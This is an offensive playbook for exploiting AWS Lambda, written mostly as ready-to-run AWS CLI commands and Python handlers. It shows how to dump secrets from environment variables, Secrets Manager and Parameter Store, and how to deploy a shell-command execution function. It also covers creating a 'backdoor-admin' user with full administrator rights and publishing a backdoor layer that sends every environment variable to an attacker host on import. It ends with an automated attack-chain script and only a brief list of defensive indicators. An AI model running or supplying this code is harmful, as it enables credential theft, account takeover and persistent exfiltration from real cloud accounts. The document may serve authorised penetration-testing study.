# AWS Lambda Exploitation & Code Execution

## Overview

Lambda functions represent a critical attack surface:
- Functions often have excessive IAM permissions
- Code stored in S3 with weak access controls
- Execution role credentials available during execution
- Environment variables contain secrets
- Layer functionality enables supply chain attacks
- Direct invocation possible via console/CLI

---

## Lambda Enumeration

### 1. List and Identify Functions

```bash
# List all Lambda functions
aws lambda list-functions \
  --query 'Functions[].[FunctionName,Runtime,Role]' \
  --output table

# Get detailed function configuration
aws lambda get-function-configuration \
  --function-name {function-name}

# Find functions with suspicious names
aws lambda list-functions \
  --query "Functions[?contains(FunctionName, 'admin') || contains(FunctionName, 'secret') || contains(FunctionName, 'data')].[FunctionName]" \
  --output text
```

### 2. Extract IAM Roles

```bash
# Get execution role from function
ROLE=$(aws lambda get-function-configuration \
  --function-name {function-name} \
  --query 'Role' --output text)

echo $ROLE  # e.g., arn:aws:iam::123456789012:role/lambda-exec-role

# Get role policies
aws iam list-role-policies --role-name {role-name}

# Get inline policies
aws iam get-role-policy \
  --role-name {role-name} \
  --policy-name {policy-name}

# Get attached policies
aws iam list-attached-role-policies --role-name {role-name}
```

### 3. Environment Variable Extraction

```bash
# Get function configuration (includes env vars)
aws lambda get-function-configuration \
  --function-name {function-name} \
  | jq '.Environment.Variables'

# Example output:
# {
#   "DB_PASSWORD": "MyPassword123!",
#   "API_KEY": "sk-1234567890abcdef",
#   "ENCRYPTION_KEY": "base64-encoded-key"
# }

# Extract all environment variables from all functions
for func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
  echo "[*] $func:"
  aws lambda get-function-configuration --function-name $func \
    | jq '.Environment.Variables'
done
```

---

## Function Code Extraction

### 1. Download Function Code

```bash
# Get function code location
aws lambda get-function \
  --function-name {function-name} \
  --query 'Code.Location' --output text

# Download code (usually in S3)
DOWNLOAD_URL=$(aws lambda get-function \
  --function-name {function-name} \
  --query 'Code.Location' --output text)

curl -o function-code.zip "$DOWNLOAD_URL"
unzip function-code.zip
```

### 2. Extract S3 Backend Code

```bash
# Some functions reference external code in S3
# Check function configuration for S3Bucket and S3Key
aws lambda get-function-configuration \
  --function-name {function-name} \
  | jq '.CodeSha256, .CodeSize'

# List Lambda code storage buckets
aws s3 ls | grep lambda

# Download function code from S3
aws s3 cp s3://lambda-code-bucket/functions/ ./ --recursive
```

### 3. Analyze Dependencies and Layers

```bash
# Check Lambda layers
aws lambda get-function-configuration \
  --function-name {function-name} \
  | jq '.Layers'

# Download layer code
aws lambda get-layer-version \
  --layer-name {layer-name} \
  --version-number {version} \
  --query 'Content.Location' --output text | xargs curl -o layer.zip

# Extract layer contents
unzip layer.zip -d /tmp/layer
ls /tmp/layer/python/site-packages/  # Or nodejs/node_modules/
```

---

## Function Invocation & Exploitation

### 1. Direct Function Invocation

```bash
# Invoke function with payload
aws lambda invoke \
  --function-name {function-name} \
  --payload '{"action":"execute","command":"whoami"}' \
  output.json

cat output.json
```

### 2. Exploit Execution Role Permissions

```bash
# During function execution, credentials are available via metadata
# Create Lambda function that uses execution role

cat > exploit_function.py << 'EOF'
import boto3
import json
import os

def lambda_handler(event, context):
    # Execution role credentials automatically available
    # Can use any AWS service the role permits
    
    # List S3 buckets
    s3 = boto3.client('s3')
    buckets = s3.list_buckets()
    
    # Download sensitive bucket
    for obj in s3.list_objects_v2(Bucket='sensitive-bucket')['Contents']:
        response = s3.get_object(Bucket='sensitive-bucket', Key=obj['Key'])
        print(response['Body'].read().decode())
    
    return {
        'statusCode': 200,
        'body': json.dumps('Exfiltration complete')
    }
EOF

# Create function
aws lambda create-function \
  --function-name exploit-function \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/lambda-exec-role \
  --handler exploit_function.lambda_handler \
  --zip-file fileb://exploit_function.zip

# Invoke
aws lambda invoke --function-name exploit-function output.json
```

### 3. Command Execution via Environment

```bash
# Some Lambda functions might execute shell commands
# Create function that breaks out

cat > rce_function.py << 'EOF'
import subprocess
import json

def lambda_handler(event, context):
    try:
        # Execute command from event
        command = event.get('command', 'whoami')
        result = subprocess.run(command, shell=True, capture_output=True)
        
        return {
            'statusCode': 200,
            'body': json.dumps({
                'stdout': result.stdout.decode(),
                'stderr': result.stderr.decode()
            })
        }
    except Exception as e:
        return {'statusCode': 500, 'body': str(e)}
EOF

# Invoke with command
aws lambda invoke \
  --function-name rce_function \
  --payload '{"command":"cat /etc/passwd"}' \
  output.json
```

### 4. Async Invocation for Stealth

```bash
# Invoke asynchronously to avoid waiting for response
aws lambda invoke \
  --function-name {function-name} \
  --invocation-type Event \
  --payload '{"malicious":"payload"}' \
  output.json

# Function executes in background, harder to trace
```

---

## Credential Extraction from Functions

### 1. Environment Variables

```bash
# Already covered above - extract via get-function-configuration
# Secrets stored in environment: DB passwords, API keys, encryption keys

aws lambda get-function-configuration \
  --function-name {function-name} | jq '.Environment'
```

### 2. Secrets Manager Integration

```bash
# Functions often reference Secrets Manager
# Check execution role policy for secretsmanager permissions
aws iam get-role-policy \
  --role-name lambda-exec-role \
  --policy-name inline-policy | jq '.PolicyDocument'

# If role can access secrets, list them
aws secretsmanager list-secrets \
  --query 'SecretList[].[Name,Description]' --output table

# Get secret values
aws secretsmanager get-secret-value \
  --secret-id {secret-name} \
  --query 'SecretString' --output text
```

### 3. Parameter Store Access

```bash
# Check if function uses Parameter Store
# Look in function code for ssm:GetParameter calls

# Extract parameters (if execution role allows)
aws ssm describe-parameters \
  --parameter-filters "Key=Name,Values=/lambda/*"

aws ssm get-parameter \
  --name /lambda/db-password \
  --with-decryption \
  --query 'Parameter.Value' --output text
```

### 4. Database Connection Strings

```bash
# Functions often store connection strings
# Search function code for common patterns
grep -r "host=\|server=\|connection=" function-code/

# Example MySQL extraction
CONN_STR=$(grep "mysql://" function-code/*.py | head -1)
# Parse connection string
# mysql://admin:P@ssw0rd@prod-db.rds.amazonaws.com:3306/production
```

---

## Privilege Escalation via Lambda

### 1. Exploit Overly Permissive Role

```bash
# If lambda execution role has admin or extensive permissions
# Create function that exploits this

cat > privesc_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    
    # Create new admin user
    iam.create_user(UserName='backdoor-admin')
    
    # Attach admin policy
    iam.attach_user_policy(
        UserName='backdoor-admin',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    # Create access keys
    response = iam.create_access_key(UserName='backdoor-admin')
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'AccessKeyId': response['AccessKey']['AccessKeyId'],
            'SecretAccessKey': response['AccessKey']['SecretAccessKey']
        })
    }
EOF
```

### 2. Assume Role with Higher Privileges

```bash
# If Lambda role can assume other roles
# Check role trust relationships

aws iam get-role \
  --role-name lambda-exec-role \
  | jq '.Role.AssumeRolePolicyDocument'

# If can assume management role, escalate
cat > assume_role_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    sts = boto3.client('sts')
    
    # Assume higher-privilege role
    assumed_role = sts.assume_role(
        RoleArn='arn:aws:iam::123456789012:role/AdminRole',
        RoleSessionName='elevated-session'
    )
    
    # Use temporary credentials with higher privileges
    elevated_creds = assumed_role['Credentials']
    
    return {
        'AccessKeyId': elevated_creds['AccessKeyId'],
        'SecretAccessKey': elevated_creds['SecretAccessKey'],
        'SessionToken': elevated_creds['SessionToken']
    }
EOF
```

---

## Persistence Installation

### 1. Lambda Layer Backdoor

```bash
# Create malicious Lambda layer
mkdir -p python/site-packages
cat > python/site-packages/backdoor.py << 'EOF'
import boto3
import os

# On import, exfiltrate environment
exfil_data = {
    'env_vars': dict(os.environ),
    'region': boto3.Session().region_name
}

# Send to attacker
import requests
requests.post('https://attacker-exfil.com/lambda-data', json=exfil_data)
EOF

zip -r layer.zip python/
aws lambda publish-layer-version \
  --layer-name backdoor-layer \
  --zip-file fileb://layer.zip

# Attach layer to target functions
aws lambda update-function-configuration \
  --function-name {target-function} \
  --layers arn:aws:lambda:us-east-1:123456789012:layer:backdoor-layer:1
```

### 2. Function Policy Modification

```bash
# Modify function resource policy to allow external invocation
aws lambda add-permission \
  --function-name {function-name} \
  --statement-id AllowExternalInvoke \
  --action lambda:InvokeFunction \
  --principal '*'

# Now function can be invoked from anywhere
aws lambda invoke \
  --function-name {function-name} \
  --payload '{"malicious":"code"}' \
  output.json
```

### 3. EventBridge Trigger Installation

```bash
# Create scheduled event that triggers compromised function
aws events put-rule \
  --name backdoor-trigger \
  --schedule-expression 'rate(5 minutes)'

aws events put-targets \
  --rule backdoor-trigger \
  --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:{function-name}"

# Function executes every 5 minutes with exfiltration payload
```

---

## Lambda@Edge Exploitation

```bash
# If Lambda@Edge functions exist (CloudFront integration)
# Functions execute on edge locations globally

# List edge functions
aws lambda list-functions \
  --query 'Functions[?contains(Arn, `:function:`)]'

# Edge functions can intercept and modify requests/responses
# Potential for MITM attacks on CDN traffic

# Check CloudFront distributions using Lambda@Edge
aws cloudfront list-distributions \
  --query 'DistributionList.Items[].[Id,DomainName,DefaultCacheBehavior.LambdaFunctionAssociations]'
```

---

## Comprehensive Lambda Attack Scenario

```bash
#!/bin/bash
# Complete Lambda exploitation chain

echo "[*] Lambda Function Exploitation Chain"

# 1. List all functions and identify high-value targets
echo "[*] Enumerating functions..."
aws lambda list-functions \
  --query 'Functions[].[FunctionName,Runtime,Role]' > functions.txt

# 2. For each function, extract credentials
while read -r func role; do
  echo "[+] Processing $func"
  
  # Get environment variables
  aws lambda get-function-configuration \
    --function-name $func \
    | jq '.Environment.Variables' > ${func}-env.json
  
  # Extract credentials
  grep -i "password\|key\|token\|secret" ${func}-env.json && echo "[+] Credentials found in $func"
done < functions.txt

# 3. Download function code
echo "[*] Downloading function code..."
for func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
  URL=$(aws lambda get-function --function-name $func --query 'Code.Location' --output text)
  curl -s -o ${func}-code.zip "$URL"
done

# 4. Escalate privileges via function invocation
echo "[*] Attempting privilege escalation..."
aws lambda invoke \
  --function-name {high-value-function} \
  --payload '{"action":"list-buckets"}' \
  escalation-output.json

# 5. Install persistence
echo "[*] Installing persistence layer..."
aws lambda publish-layer-version \
  --layer-name persistence-layer \
  --zip-file fileb://backdoor-layer.zip

# 6. Attach to critical functions
for func in $(grep -i "critical\|payment\|auth" functions.txt | awk '{print $1}'); do
  aws lambda update-function-configuration \
    --function-name $func \
    --layers arn:aws:lambda:us-east-1:123456789012:layer:persistence-layer:1
done

echo "[+] Lambda exploitation complete"
```

---

## Defensive Indicators

Monitor for:
- Unusual Lambda function creation
- Creation of Lambda layers with suspicious code
- Function code downloads
- Environment variable access
- Execution role assumption
- Async function invocations from unusual principals
- New resource policies granting broad permissions
- Unexpected layer attachments to functions
- EventBridge rules triggering Lambda functions frequently
